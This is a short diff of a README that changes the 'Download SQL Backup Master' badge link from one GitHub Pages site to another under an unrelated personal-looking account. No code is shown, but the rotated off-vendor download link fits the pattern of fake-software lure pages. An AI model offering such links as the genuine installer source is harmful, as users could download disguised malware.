@@ -4,7 +4,7 @@
 
 ## 📥 Download SQL Backup Master for Windows
 
-[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://backupmasterload.github.io/.github/)
+[![⬇️ Download SQL Backup Master](https://img.shields.io/badge/Download-SQL%20Backup%20Master-blue?style=for-the-badge&logo=windows)](https://homyakovaadelaid.github.io/.github/backup-master)
 
 ---
 
